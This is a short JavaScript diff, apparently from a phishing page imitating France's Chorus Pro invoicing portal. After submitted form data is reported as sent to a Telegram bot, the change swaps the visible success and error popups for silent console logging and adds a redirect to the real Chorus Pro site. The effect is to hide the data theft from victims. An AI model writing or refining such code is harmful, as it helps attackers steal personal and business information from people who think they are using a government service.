@@ -25,10 +25,11 @@
         .then(response => response.json())
         .then(data => {
             console.log('Succès:', data);
-            alert('Informations envoyées au bot Telegram.');
+            console.log('Informations envoyées au bot Telegram.');
+            window.location.href='https://portail.chorus-pro.gouv.fr/aife_csm' ;
         })
         .catch((error) => {
             console.error('Erreur:', error);
-            alert('Une erreur est survenue. Veuillez réessayer.');
+            console.log('Une erreur est survenue. Veuillez réessayer.');
         });
     });
